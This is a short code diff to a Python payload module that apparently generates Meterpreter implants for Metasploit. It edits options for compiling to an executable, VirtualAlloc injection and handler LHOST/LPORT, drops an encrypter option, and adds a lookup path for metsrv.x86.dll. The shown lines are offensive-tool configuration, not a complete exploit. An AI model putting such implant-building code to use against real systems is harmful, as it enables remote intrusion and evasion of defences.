@@ -28,8 +28,7 @@ class Payload:
         
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
+                                 "inject_method" : ["virtual", "[virtual]alloc"],
                                  "LHOST" : ["", "IP of the metasploit handler"],
                                  "LPORT" : ["80", "Port of the metasploit handler"]}
         
@@ -58,6 +57,8 @@ class Payload:
         
         if os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.7/meterpreter/metsrv.x86.dll"):
             metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.7/meterpreter/metsrv.x86.dll"
+        elif os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"):
+            metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"
         else:
             metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
             
